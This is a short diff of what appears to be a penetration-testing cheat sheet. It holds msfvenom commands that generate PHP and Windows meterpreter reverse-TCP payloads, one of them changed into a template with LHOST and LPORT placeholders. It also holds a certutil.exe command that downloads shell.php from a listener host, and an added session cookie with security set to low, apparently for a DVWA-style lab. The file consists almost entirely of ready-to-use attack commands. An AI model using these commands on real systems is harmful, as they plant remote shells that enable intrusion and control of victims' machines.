@@ -12,4 +12,10 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f raw > 
 certutil.exe -urlcache -f http://192.168.0.111/shell.php shell.php
 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe
+
+
+
+PHPSESSID:dd0s1qjfigdgnb5uv9s6f9420m;security:low;
+
+Submit:Submit;
